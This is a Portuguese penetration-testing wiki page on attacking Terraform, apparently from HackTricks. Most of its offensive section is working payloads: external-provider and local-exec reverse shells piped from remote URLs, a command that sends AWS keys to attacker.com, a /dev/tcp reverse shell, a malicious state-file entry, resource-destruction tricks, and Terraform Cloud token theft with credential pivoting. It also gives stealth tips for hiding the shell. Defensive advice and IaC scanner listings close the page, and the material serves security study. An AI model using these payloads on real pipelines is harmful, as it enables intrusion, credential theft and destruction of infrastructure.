# Terraform Seguran√ßa

{{#include ../banners/hacktricks-training.md}}

## Informa√ß√µes B√°sicas

[From the docs:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform √© uma ferramenta de **infrastructure as code** que permite definir tanto **recursos cloud quanto on-prem** em arquivos de configura√ß√£o leg√≠veis por humanos que voc√™ pode versionar, reutilizar e compartilhar. Voc√™ pode ent√£o usar um fluxo de trabalho consistente para provisionar e gerenciar toda a sua infraestrutura ao longo do seu ciclo de vida. Terraform pode gerenciar componentes de baixo n√≠vel como compute, storage e recursos de networking, bem como componentes de alto n√≠vel como entradas DNS e funcionalidades de SaaS.

#### Como o Terraform funciona?

Terraform cria e gerencia recursos em plataformas cloud e outros servi√ßos atrav√©s de suas application programming interfaces (APIs). Providers permitem que o Terraform trabalhe com virtualmente qualquer plataforma ou servi√ßo com uma API acess√≠vel.

![](<../images/image (177).png>)

HashiCorp e a comunidade Terraform j√° escreveram **mais de 1700 providers** para gerenciar milhares de diferentes tipos de recursos e servi√ßos, e esse n√∫mero continua crescendo. Voc√™ pode encontrar todos os providers publicamente dispon√≠veis no [Terraform Registry](https://registry.terraform.io/), incluindo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, e muitos outros.

O fluxo de trabalho core do Terraform consiste em tr√™s est√°gios:

- **Write:** Voc√™ define recursos, que podem estar em m√∫ltiplos cloud providers e servi√ßos. Por exemplo, voc√™ pode criar uma configura√ß√£o para deployar uma aplica√ß√£o em m√°quinas virtuais em uma Virtual Private Cloud (VPC) com security groups e um load balancer.
- **Plan:** Terraform cria um execution plan descrevendo a infraestrutura que ser√° criada, atualizada ou destru√≠da com base na infraestrutura existente e na sua configura√ß√£o.
- **Apply:** Mediante aprova√ß√£o, Terraform executa as opera√ß√µes propostas na ordem correta, respeitando quaisquer depend√™ncias entre recursos. Por exemplo, se voc√™ atualizar as propriedades de uma VPC e alterar o n√∫mero de m√°quinas virtuais nessa VPC, Terraform recriar√° a VPC antes de escalar as m√°quinas virtuais.

![](<../images/image (215).png>)

### Terraform Lab

Basta instalar terraform no seu computador.

Aqui voc√™ tem um [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) e aqui voc√™ tem a [best way to download terraform](https://www.terraform.io/downloads).

## RCE in Terraform: config file poisoning

Terraform **n√£o exp√µe uma plataforma com p√°gina web ou um servi√ßo de rede** que possamos enumerar, portanto, a √∫nica forma de comprometer terraform √© **ser capaz de adicionar/modificar arquivos de configura√ß√£o do terraform** ou **ser capaz de modificar o terraform state file** (veja cap√≠tulo abaixo).

No entanto, terraform √© um **componente muito sens√≠vel** para comprometer porque ele ter√° **acesso privilegiado** a diferentes locais para poder funcionar corretamente.

A forma principal de um atacante comprometer o sistema onde o terraform est√° rodando √© **comprometer o reposit√≥rio que armazena as configura√ß√µes do terraform**, porque em algum momento elas v√£o ser **interpretadas**.

Na verdade, existem solu√ß√µes que **executam terraform plan/apply automaticamente ap√≥s um PR** ser criado, como o **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

Se voc√™ for capaz de comprometer um arquivo terraform existem diferentes formas de realizar RCE quando algu√©m executa `terraform plan` ou `terraform apply`.

### Terraform plan

Terraform plan √© o **comando mais usado** no terraform e desenvolvedores/solu√ß√µes que usam terraform o chamam o tempo todo, ent√£o a **maneira mais f√°cil de conseguir RCE** √© garantir que voc√™ envenene um arquivo de configura√ß√£o terraform que ir√° executar comandos arbitr√°rios em um `terraform plan`.

**Using an external provider**

Terraform oferece o [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) que fornece uma forma de interface entre Terraform e programas externos. Voc√™ pode usar a data source `external` para executar c√≥digo arbitr√°rio durante um `plan`.

Injectar em um arquivo de configura√ß√£o terraform algo como o seguinte ir√° executar um rev shell quando for executado `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Usando um provedor personalizado**

Um atacante poderia enviar um [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) para o [Terraform Registry](https://registry.terraform.io/) e ent√£o adicion√°-lo ao c√≥digo Terraform em uma feature branch ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
O provider √© baixado no `init` e executar√° o c√≥digo malicioso quando `plan` for executado

Voc√™ pode encontrar um exemplo em [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Usando uma refer√™ncia externa**

Ambas as op√ß√µes mencionadas s√£o √∫teis, mas n√£o muito discretas (a segunda √© mais discreta, por√©m mais complexa que a primeira). Voc√™ pode realizar este ataque de forma ainda mais **discreta**, seguindo estas sugest√µes:

- Em vez de adicionar o rev shell diretamente no arquivo terraform, voc√™ pode **carregar um recurso externo** que contenha o rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Voc√™ pode encontrar o c√≥digo rev shell em [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- No recurso externo, use a funcionalidade **ref** para esconder o **terraform rev shell code in a branch** dentro do reposit√≥rio, algo como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply ser√° executado para aplicar todas as altera√ß√µes, voc√™ tamb√©m pode abusar disso para obter RCE injetando **um arquivo Terraform malicioso com** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Voc√™ s√≥ precisa garantir que algum payload como os seguintes termine no arquivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Siga as **sugest√µes da t√©cnica anterior** para realizar este ataque de forma **mais furtiva usando refer√™ncias externas**.

## Dumps de Segredos

Voc√™ pode fazer com que os **valores secretos usados pelo terraform sejam extra√≠dos** ao executar `terraform apply` adicionando ao arquivo terraform algo como:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Abusando dos state files do Terraform

Caso voc√™ tenha acesso de escrita aos terraform state files mas n√£o possa alterar o c√≥digo do terraform, [**esta pesquisa**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) apresenta algumas op√ß√µes interessantes para tirar proveito do arquivo. Mesmo que voc√™ tivesse acesso de escrita aos arquivos de configura√ß√£o, usar o vetor dos state files costuma ser muito mais sorrateiro, j√° que voc√™ n√£o deixa rastros no hist√≥rico do `git`.

### RCE in Terraform: config file poisoning

√â poss√≠vel [criar um provider customizado](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) e simplesmente substituir um dos providers no terraform state file pelo malicioso ou adicionar um recurso falso referenciando o provider malicioso.

O provider [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) baseia-se na pesquisa e weaponiza esse princ√≠pio. Voc√™ pode adicionar um recurso falso e colocar o comando bash arbitr√°rio que deseja executar no atributo `command`. Quando a execu√ß√£o do `terraform` for acionada, isso ser√° lido e executado tanto no `terraform plan` quanto no `terraform apply`. No caso do passo `terraform apply`, o `terraform` vai apagar o recurso falso do state file ap√≥s executar seu comando, limpando os rastros. Mais informa√ß√µes e uma demo completa podem ser encontradas no [reposit√≥rio GitHub que hospeda o c√≥digo fonte deste provider](https://github.com/offensive-actions/terraform-provider-statefile-rce).

Para us√°-lo diretamente, basta incluir o seguinte em qualquer posi√ß√£o do array `resources` e customizar os atributos `name` e `command`:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Ent√£o, assim que `terraform` for executado, seu c√≥digo ser√° executado.

### Removendo recursos <a href="#deleting-resources" id="deleting-resources"></a>

Existem 2 maneiras de destruir recursos:

1. **Inserir um recurso com um nome aleat√≥rio no arquivo state apontando para o recurso real a ser destru√≠do**

Porque terraform ver√° que o recurso n√£o deveria existir, ele o destruir√° (seguindo o ID do recurso real indicado). Exemplo da p√°gina anterior:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Modificar o recurso para for√ßar sua exclus√£o de forma que n√£o seja poss√≠vel atualiz√°-lo (assim ele ser√° exclu√≠do e recriado)**

Para uma inst√¢ncia EC2, modificar o tipo da inst√¢ncia √© suficiente para fazer o terraform exclu√≠-la e recri√°-la.

### Substituir provedor bloqueado

Caso voc√™ encontre uma situa√ß√£o em que `hashicorp/external` foi bloqueado, voc√™ pode reimplementar o provedor `external` fazendo o seguinte. Nota: Usamos um fork do provedor external publicado em https://registry.terraform.io/providers/nazarewk/external/latest. Voc√™ pode publicar seu pr√≥prio fork ou reimplementa√ß√£o tamb√©m.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Ent√£o voc√™ pode usar `external` normalmente.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

Este cen√°rio abusa dos runners do Terraform Cloud (TFC) durante speculative plans para pivot into the target cloud account.

- Pr√©-condi√ß√µes:
- Roube um token do Terraform Cloud de uma m√°quina de desenvolvedor. O CLI armazena tokens em plaintext em `~/.terraform.d/credentials.tfrc.json`.
- O token deve ter acesso √† organiza√ß√£o/workspace alvo e pelo menos a permiss√£o `plan`. Workspaces com VCS bloqueiam `apply` via CLI, mas ainda permitem speculative plans.

- Descubra configura√ß√µes de workspace e VCS via a API do TFC:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- Acionar code execution durante um speculative plan usando o external data source e o Terraform Cloud "cloud" block para direcionar o VCS-backed workspace:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
Exemplo rsync.sh para obter um reverse shell no TFC runner:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
Execute um plano especulativo para rodar o programa no runner ef√™mero:
```bash
terraform init
terraform plan
```
- Enumerar e exfiltrar credenciais de cloud injetadas no runner. Durante as execu√ß√µes, o TFC injeta credenciais do provider via arquivos e vari√°veis de ambiente:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
Arquivos esperados no diret√≥rio de trabalho do runner:
- GCP:
- `tfc-google-application-credentials` (config JSON do Workload Identity Federation)
- `tfc-gcp-token` (token de acesso GCP de curta dura√ß√£o)
- AWS:
- `tfc-aws-shared-config` (config de web identity/OIDC para assun√ß√£o de role)
- `tfc-aws-token` (token de curta dura√ß√£o; algumas orgs podem usar chaves est√°ticas)

- Use as credenciais de curta dura√ß√£o fora de banda para contornar os gates do VCS:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
Com essas credenciais, atacantes podem criar/modificar/destruir recursos diretamente usando CLIs nativos, contornando fluxos de trabalho baseados em PR que bloqueiam `apply` via VCS.

- Orienta√ß√£o defensiva:
- Aplique o princ√≠pio do menor privil√©gio a usu√°rios/equipes e tokens do TFC. Audite associa√ß√µes e evite propriet√°rios com privil√©gios excessivos.
- Restrinja a permiss√£o `plan` em workspaces sens√≠veis vinculados ao VCS quando poss√≠vel.
- Imponha allowlists de provider/data source com pol√≠ticas Sentinel para bloquear `data "external"` ou providers desconhecidos. Veja a orienta√ß√£o da HashiCorp sobre provider filtering.
- Prefira OIDC/WIF em vez de credenciais est√°ticas de cloud; trate runners como sens√≠veis. Monitore execu√ß√µes especulativas de plan e tr√°fego de sa√≠da inesperado.
- Detecte exfiltra√ß√£o de artefatos de credenciais `tfc-*` e alerte sobre uso suspeito do programa `external` durante execu√ß√µes de plan.


## Comprometendo Terraform Cloud

### Usando um token

Como **[explicado neste post](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)**, o terraform CLI armazena tokens em texto plano em **`~/.terraform.d/credentials.tfrc.json`**. Roubar esse token permite que um atacante se fa√ßa passar pelo usu√°rio dentro do escopo do token.

Usando esse token, √© poss√≠vel obter a org/workspace com:
```bash
GET https://app.terraform.io/api/v2/organizations/acmecorp/workspaces/gcp-infra-prod
Authorization: Bearer <TF_TOKEN>
```
Ent√£o √© poss√≠vel executar c√≥digo arbitr√°rio usando **`terraform plan`** conforme explicado no cap√≠tulo anterior.

### Escaping to the cloud

Ent√£o, se o runner estiver localizado em algum ambiente de cloud, √© poss√≠vel obter um token do principal associado ao runner e us√°-lo fora de banda.

- **GCP files (present in current run working directory)**
- `tfc-google-application-credentials` ‚Äî JSON config for Workload Identity Federation(WIF) that tells Google how to exchange the external identity.
- `tfc-gcp-token` ‚Äî short‚Äëlived (‚âà1 hour) GCP access token referenced by the above

- **AWS files**
- `tfc-aws-shared-config` ‚Äî JSON for web identity federation/OIDC role assumption
(preferred over static keys).
- `tfc-aws-token` ‚Äî short‚Äëlived token, or potentially static IAM keys if misconfigured.


## Automatic Audit Tools

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

A Snyk oferece uma solu√ß√£o abrangente de scanning de Infrastructure as Code (IaC) que detecta vulnerabilidades e configura√ß√µes incorretas em Terraform, CloudFormation, Kubernetes, e outros formatos IaC.

- **Recursos:**
- Escaneamento em tempo real para vulnerabilidades de seguran√ßa e problemas de conformidade.
- Integra√ß√£o com sistemas de controle de vers√£o (GitHub, GitLab, Bitbucket).
- Pull requests automatizados de corre√ß√£o.
- Orienta√ß√£o detalhada de remedia√ß√£o.
- **Inscreva-se:** Crie uma conta em [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** √© uma ferramenta de an√°lise est√°tica de c√≥digo para infraestrutura como c√≥digo (IaC) e tamb√©m uma ferramenta de an√°lise de composi√ß√£o de software (SCA) para imagens e pacotes open source.

Ele analisa infraestrutura em nuvem provisionada usando [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), or [OpenTofu](https://opentofu.org/) e detecta misconfigura√ß√µes de seguran√ßa e conformidade usando varredura baseada em grafo.

Ele executa [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md), que √© uma verifica√ß√£o de pacotes open source e imagens em busca de Common Vulnerabilities and Exposures (CVEs).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` √© um framework de testes leve, focado em security e compliance, para terraform, que permite a capacidade de negative testing para sua infraestrutura como c√≥digo.

- **compliance:** Garantir que o c√≥digo implementado esteja seguindo padr√µes de seguran√ßa, seus pr√≥prios padr√µes personalizados
- **behaviour driven development:** Temos BDD para quase tudo, por que n√£o para IaC?
- **portable:** basta instalar via `pip` ou execut√°-lo via `docker`. See [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** valida seu c√≥digo antes de ser deployado
- **easy to integrate:** pode rodar no seu pipeline (ou em git hooks) para garantir que todas as implanta√ß√µes sejam validadas.
- **segregation of duty:** voc√™ pode manter seus testes em um reposit√≥rio diferente onde uma equipe separada √© respons√°vel.

> [!NOTE]
> Infelizmente, se o c√≥digo estiver usando alguns providers aos quais voc√™ n√£o tem acesso, voc√™ n√£o conseguir√° executar o `terraform plan` e rodar esta ferramenta.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

Segundo os [**docs**](https://github.com/aquasecurity/tfsec): tfsec usa an√°lise est√°tica do seu c√≥digo Terraform para identificar poss√≠veis misconfigura√ß√µes.

- ‚òÅÔ∏è Verifica misconfigura√ß√µes em todos os principais (e alguns secund√°rios) provedores de nuvem
- ‚õî Centenas de regras integradas
- ü™Ü Escaneia m√≥dulos (locais e remotos)
- ‚ûï Avalia express√µes HCL assim como valores literais
- ‚Ü™Ô∏è Avalia fun√ß√µes do Terraform e.g. `concat()`
- üîó Avalia rela√ß√µes entre recursos do Terraform
- üß∞ Compat√≠vel com o Terraform CDK
- üôÖ Aplica (e enriquece) pol√≠ticas Rego definidas pelo usu√°rio
- üìÉ Suporta m√∫ltiplos formatos de sa√≠da: lovely (padr√£o), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- üõ†Ô∏è Configur√°vel (via flags de CLI e/ou arquivo de configura√ß√£o)
- ‚ö° Muito r√°pido, capaz de escanear rapidamente reposit√≥rios enormes
```bash
brew install tfsec
tfsec /path/to/folder
```
### [terrascan](https://github.com/tenable/terrascan)

Terrascan √© um analisador est√°tico de c√≥digo para Infrastructure as Code. Terrascan permite que voc√™:

- Escanear infrastructure as code para detectar misconfigura√ß√µes de forma transparente.
- Monitorar a infraestrutura provisionada em cloud para altera√ß√µes de configura√ß√£o que introduzam posture drift, e possibilitar reverter para uma postura segura.
- Detectar vulnerabilidades de seguran√ßa e viola√ß√µes de conformidade.
- Mitigar riscos antes de provisionar infraestrutura cloud native.
- Oferece flexibilidade para executar localmente ou integrar com seu CI\CD.
```bash
brew install terrascan
terrascan scan -d /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

Encontre vulnerabilidades de seguran√ßa, problemas de conformidade e misconfigura√ß√µes de infraestrutura no in√≠cio do ciclo de desenvolvimento da sua infraestrutura como c√≥digo com **KICS** da Checkmarx.

**KICS** stands for **K**eeping **I**nfrastructure as **C**ode **S**ecure, √© open source e √© indispens√°vel para qualquer projeto cloud native.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

De acordo com os [**docs**](https://github.com/tenable/terrascan): Terrascan √© um analisador est√°tico de c√≥digo para infraestrutura como c√≥digo. Terrascan permite que voc√™:

- Escanear infraestrutura como c√≥digo de forma transparente em busca de misconfigura√ß√µes.
- Monitorar a infraestrutura em nuvem provisionada por altera√ß√µes de configura√ß√£o que introduzam desvio de postura, e possibilitar reverter para uma postura segura.
- Detectar vulnerabilidades de seguran√ßa e viola√ß√µes de conformidade.
- Mitigar riscos antes do provisionamento de infraestrutura nativa na nuvem.
- Oferecer flexibilidade para rodar localmente ou integrar com seu CI\CD.
```bash
brew install terrascan
```
## Refer√™ncias

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API ‚Äì Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI ‚Äì OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider ‚Äì Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform ‚Äì Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs ‚Äì Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
